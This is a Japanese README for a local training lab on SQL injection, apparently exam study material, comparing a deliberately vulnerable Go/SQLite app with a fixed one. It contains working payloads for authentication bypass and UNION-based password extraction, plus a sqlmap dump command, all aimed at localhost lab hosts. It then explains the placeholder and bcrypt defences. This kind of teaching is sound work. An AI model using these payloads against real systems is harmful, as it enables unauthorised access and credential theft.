# web/01-sqli — SQLインジェクション

## 目的
SQL文を文字列連結で組み立てる実装の危険性を体験する。認証バイパスと UNION によるデータ抽出を実際に成功させ、プレースホルダ（プリペアドステートメント）で無効化できることを確認する。Web系ラボの基本形（Go + html/template + SQLite、vulnerable/fixed、Burpで観察）。

## 構成
| ホスト | URL | 実装 |
|---|---|---|
| vuln | http://127.0.0.1:8081 | SQLを文字列連結で生成 |
| fixed | http://127.0.0.1:8082 | プレースホルダ＋パスワードはbcrypt検証 |
| attacker | （lab内） | sqlmap 等。`make shell` で利用 |

ブラウザ（Firefox）＋ Burp Suite は Mac から `127.0.0.1` で操作する。
初期データ: ユーザ admin / alice、商品3件。

## 攻撃
```sh
make up LAB=web/01-sqli
```
ブラウザで http://127.0.0.1:8081 を開く。

**1) 認証バイパス** — ユーザ名に `admin' -- `、パスワードは任意。
生成されるSQL: `... WHERE username='admin' -- ' AND password='x'`（以降がコメント化）。
```sh
curl -s http://127.0.0.1:8081/login \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x"
# → 「ようこそ、admin さん（ログイン成功）」
```

**2) UNIONベースでパスワード抽出** — 商品検索に注入。
```sh
curl -s http://127.0.0.1:8081/search --get \
  --data-urlencode "q=zzz' UNION SELECT username, password FROM users -- "
# → admin / S3cr3t-admin! など users テーブルが表に出る
```

**3) sqlmap（自動化）**
```sh
make shell LAB=web/01-sqli
sqlmap -u 'http://vuln:8080/search?q=1' --batch --dump -T users
```

## 対策（fixed）
同じ攻撃を http://127.0.0.1:8082 に対して行うと、
- 認証バイパス → 「ログイン失敗」
- UNION注入 → 文字列として検索され、結果は0件

差分のポイント（`vulnerable/main.go` と `fixed/main.go` を比較）:
- `fmt.Sprintf` でSQLに値を連結 → **`?` プレースホルダで値を渡す**（値はSQL構文として解釈されない）
- 平文パスワード比較 → **bcryptハッシュで検証**
- 併せて: 最小権限のDBユーザ、エラーメッセージを詳細に出さない、入力検証

## 試験での問われ方
- SQLインジェクションの原理、バインド機構（プレースホルダ）の利用
- エスケープ処理との違い（バインドが本質的対策）、WAFは多層防御の補助
- 認証バイパス・情報漏洩・改ざんに至る影響範囲
- パスワードのハッシュ保存（[[crypto/01-password-crack]] と関連）
- ブラインドSQLi、エラーベース/UNIONベースの違い

## 後片付け
```sh
make down LAB=web/01-sqli
```
